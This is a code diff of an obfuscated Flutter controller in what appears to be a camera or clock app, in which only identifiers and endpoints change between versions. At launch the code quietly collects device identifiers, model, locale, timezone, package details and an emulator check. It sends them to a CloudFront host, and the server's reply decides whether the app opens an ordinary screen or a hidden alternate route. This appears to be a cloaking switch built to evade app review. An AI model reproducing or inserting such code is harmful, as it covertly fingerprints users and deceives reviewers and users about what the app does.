@@ -10,12 +10,12 @@ import 'package:package_info_plus/package_info_plus.dart';
 
 class CameraInitLogic extends GetxController {
 
-  var suqwxjtcaf = RxBool(false);
-  var pmlcjvz = RxBool(true);
-  var uevrwzy = RxString("");
-  var pzey = RxBool(false);
-  var dajngf = RxBool(true);
-  final zgpnhiyvae = Dio();
+  var srhxmnlfwa = RxBool(false);
+  var vzgqac = RxBool(true);
+  var iregf = RxString("");
+  var fnqricvt = RxBool(false);
+  var xbryk = RxBool(true);
+  final wjemcl = Dio();
 
 
   InAppWebViewController? webViewController;
@@ -23,110 +23,109 @@ class CameraInitLogic extends GetxController {
   @override
   void onInit() {
     super.onInit();
-    nifdk();
+    xeabpmvd();
   }
 
 
-  Future<void> nifdk() async {
-    pzey.value = true;
-    dajngf.value = true;
-    pmlcjvz.value = false;
+  Future<void> xeabpmvd() async {
+    fnqricvt.value = true;
+    xbryk.value = true;
+    vzgqac.value = false;
 
-    zgpnhiyvae.post("https://d24y4eacywhew3.cloudfront.net/B1ZC3V?no_check",data: await iqtazjwhos()).then((value) {
-      var necv = value.data["necv"] as String;
-      var fcvk = value.data["fcvk"] as bool;
-      if (fcvk) {
-        uevrwzy.value = necv;
-        ugbxvcke();
+    wjemcl.post("https://du28a8hpri4ah.cloudfront.net/HWHvfc",data: await xiqfzkphjt()).then((value) {
+      var czwxa = value.data["czwxa"] as String;
+      var hsock = value.data["hsock"] as bool;
+      if (hsock) {
+        iregf.value = czwxa;
+        fvrkg();
       } else {
-        vnqehx();
+        ctbvl();
       }
     }).catchError((e) {
-      pmlcjvz.value = true;
-      dajngf.value = true;
-      pzey.value = false;
+      vzgqac.value = true;
+      xbryk.value = true;
+      fnqricvt.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> iqtazjwhos() async {
-    final DeviceInfoPlugin hjgbvt = DeviceInfoPlugin();
-    PackageInfo wgry_qrpt = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> xiqfzkphjt() async {
+    final DeviceInfoPlugin mgqybx = DeviceInfoPlugin();
+    PackageInfo cepyvm_vbtaw = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var knrvqsw = Platform.localeName;
-    var xsto = currentTimeZone;
+    var zgam = Platform.localeName;
+    var XrLRG = currentTimeZone;
 
-    var lbdo = wgry_qrpt.packageName;
-    var vnzi = wgry_qrpt.version;
-    var cwqgjpuk = wgry_qrpt.buildNumber;
+    var ypLf = cepyvm_vbtaw.packageName;
+    var WKXa = cepyvm_vbtaw.version;
+    var edtxcRgA = cepyvm_vbtaw.buildNumber;
 
-    var uqlrb = wgry_qrpt.appName;
-    var nwtv = "";
-    var epfj  = "";
-    var vfqi = "";
-    var wutedslb = "";
-    var mtysnuzp = "";
-    var yesnf = "";
-    var toxifbhs = "";
-    var bcwsmnag = "";
-    var gwqile = "";
-    var zrbu = "";
+    var ocAQNWS = cepyvm_vbtaw.appName;
+    var FPulSBY = "";
+    var HLjfiUh  = "";
+    var UIuAmn = "";
+    var qwxi = "";
+    var fubjm = "";
+    var qlha = "";
+    var xhekyf = "";
+    var fjinqde = "";
+    var zsuxcw = "";
+    var xzlot = "";
 
 
-    var igrde = "";
-    var yksjp = false;
+    var zjaFwT = "";
+    var TkjxrKt = false;
 
     if (GetPlatform.isAndroid) {
-      igrde = "android";
-      var dtmwlfu = await hjgbvt.androidInfo;
+      zjaFwT = "android";
+      var oxpkbtnzfy = await mgqybx.androidInfo;
 
-      vfqi = dtmwlfu.brand;
+      UIuAmn = oxpkbtnzfy.brand;
 
-      nwtv  = dtmwlfu.model;
-      epfj = dtmwlfu.id;
+      FPulSBY  = oxpkbtnzfy.model;
+      HLjfiUh = oxpkbtnzfy.id;
 
-      yksjp = dtmwlfu.isPhysicalDevice;
+      TkjxrKt = oxpkbtnzfy.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
-      igrde = "ios";
-      var cfjamrz = await hjgbvt.iosInfo;
-      vfqi = cfjamrz.name;
-      nwtv = cfjamrz.model;
+      zjaFwT = "ios";
+      var ebvqtd = await mgqybx.iosInfo;
+      UIuAmn = ebvqtd.name;
+      FPulSBY = ebvqtd.model;
 
-      epfj = cfjamrz.identifierForVendor ?? "";
-      yksjp  = cfjamrz.isPhysicalDevice;
+      HLjfiUh = ebvqtd.identifierForVendor ?? "";
+      TkjxrKt  = ebvqtd.isPhysicalDevice;
     }
-
     var res = {
-      "uqlrb": uqlrb,
-      "cwqgjpuk": cwqgjpuk,
-      "vnzi": vnzi,
-      "lbdo": lbdo,
-      "nwtv": nwtv,
-      "xsto": xsto,
-      "vfqi": vfqi,
-      "epfj": epfj,
-      "knrvqsw": knrvqsw,
-      "igrde": igrde,
-      "yksjp": yksjp,
-      "wutedslb" : wutedslb,
-      "mtysnuzp" : mtysnuzp,
-      "yesnf" : yesnf,
-      "toxifbhs" : toxifbhs,
-      "bcwsmnag" : bcwsmnag,
-      "gwqile" : gwqile,
-      "zrbu" : zrbu,
+      "UIuAmn": UIuAmn,
+      "edtxcRgA": edtxcRgA,
+      "WKXa": WKXa,
+      "ypLf": ypLf,
+      "FPulSBY": FPulSBY,
+      "XrLRG": XrLRG,
+      "qwxi" : qwxi,
+      "HLjfiUh": HLjfiUh,
+      "zgam": zgam,
+      "xhekyf" : xhekyf,
+      "zjaFwT": zjaFwT,
+      "TkjxrKt": TkjxrKt,
+      "fubjm" : fubjm,
+      "qlha" : qlha,
+      "fjinqde" : fjinqde,
+      "ocAQNWS": ocAQNWS,
+      "zsuxcw" : zsuxcw,
+      "xzlot" : xzlot,
 
     };
     return res;
   }
 
-  Future<void> vnqehx() async {
-    Get.offNamed("/ClockMainPage");
+  Future<void> ctbvl() async {
+    Get.offNamed("/easy_splash");
   }
 
-  Future<void> ugbxvcke() async {
-    Get.offNamed("/Outreload");
+  Future<void> fvrkg() async {
+    Get.offNamed("/easy_edit_set");
   }
 
 }
